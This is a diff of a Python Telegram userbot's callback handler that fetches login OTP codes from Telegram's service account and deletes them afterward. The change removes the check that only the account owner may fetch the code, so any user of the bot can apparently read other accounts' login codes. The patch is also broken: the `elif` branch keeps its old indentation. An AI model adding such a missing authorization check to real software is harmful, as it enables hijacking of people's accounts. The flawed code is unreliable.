@@ -269,22 +269,21 @@ async def get_num_otp(client, callback_query):
             True,
         )
     X = ubot._ubot[int(query[2])]
-    if int(query[1]) == X.me.id:
-        if query[0] == "get_otp":
-            async for otp in X.search_messages(777000, limit=1):
-                try:
-                    if not otp.text:
-                        await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
-                    else:
-                        await callback_query.edit_message_text(
+    if query[0] == "get_otp":
+        async for otp in X.search_messages(777000, limit=1):
+            try:
+                if not otp.text:
+                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
+                else:
+                    await callback_query.edit_message_text(
                             otp.text,
                             reply_markup=InlineKeyboardMarkup(
                                 Button.userbot(X.me.id, int(query[2]))
                             ),
                         )
-                        await X.delete_messages(X.me.id, otp.id)
-                except Exception as error:
-                    return await callback_query.answer(error, True)
+                    await X.delete_messages(X.me.id, otp.id)
+            except Exception as error:
+                return await callback_query.answer(error, True)
         elif query[0] == "get_phone":
             try:
                 me = await X.get_me()
